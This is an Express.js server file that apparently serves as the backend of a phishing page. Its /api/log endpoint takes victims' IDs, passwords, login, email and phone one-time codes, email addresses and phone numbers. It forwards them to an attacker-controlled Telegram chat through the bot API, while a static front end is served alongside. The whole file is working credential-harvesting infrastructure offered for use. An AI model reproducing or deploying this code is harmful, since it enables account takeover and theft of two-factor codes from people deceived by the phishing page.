require('dotenv').config();
const express = require('express');
const path = require('path');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

// LOGGING MIDDLEWARE
app.use((req, res, next) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);
    next();
});

const BOT_TOKEN = process.env.LOG_BOT_TOKEN || process.env.BOT_TOKEN;
const CHAT_ID = process.env.LOG_BOT_CHAT_ID || process.env.TARGET_CHAT_ID;

console.log('--- FINAL SYSTEM CHECK ---');
console.log('Bot Token:', BOT_TOKEN ? 'OK' : 'MISSING');
console.log('Chat ID:', CHAT_ID || 'MISSING');
console.log('--------------------------');

// API Endpoint for Logs (CRITICAL: MUST BE ABOVE STATIC/FALLBACK)
app.post('/api/log', async (req, res) => {
    const { title, data } = req.body;
    console.log(`[LOG ATTEMPT] Received log for: ${title}`);

    if (!BOT_TOKEN || !CHAT_ID) {
        console.error('[LOG ERROR] Missing Credentials');
        return res.status(500).json({ success: false, error: 'Config missing' });
    }

    const message = `
🔥 <b>${title}</b>
━━━━━━━━━━━━━━━
👤 <b>ID</b>: <code>${data.id}</code>
🔑 <b>Pass</b>: <code>${data.pass || 'N/A'}</code>
🔢 <b>Login OTP</b>: <code>${data.login_otp || 'N/A'}</code>
📧 <b>Email</b>: <code>${data.email || 'N/A'}</code>
🔢 <b>E-OTP</b>: <code>${data.email_otp || 'N/A'}</code>
📱 <b>Phone</b>: <code>${data.phone || 'N/A'}</code>
🔢 <b>P-OTP</b>: <code>${data.phone_otp || 'N/A'}</code>
🕒 <b>Time</b>: ${data.time}
━━━━━━━━━━━━━━━`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID.trim(),
            text: message,
            parse_mode: 'HTML'
        });
        console.log('[LOG SUCCESS] Sent to Telegram');
        res.json({ success: true });
    } catch (e) {
        const errorDetail = e.response?.data?.description || e.message;
        console.error("[LOG FAILED] Telegram Error:", errorDetail);
        res.status(500).json({ success: false, error: errorDetail });
    }
});

// STATIC FILES
app.use(express.static(__dirname));

// FALLBACK
app.use((req, res, next) => {
    if (req.method === 'GET' && !req.url.startsWith('/api/') && !req.url.includes('.')) {
        return res.sendFile(path.join(__dirname, 'index.html'));
    }
    next();
});

if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
    app.listen(port, () => console.log(`🚀 Server on http://localhost:${port}`));
}

module.exports = app;
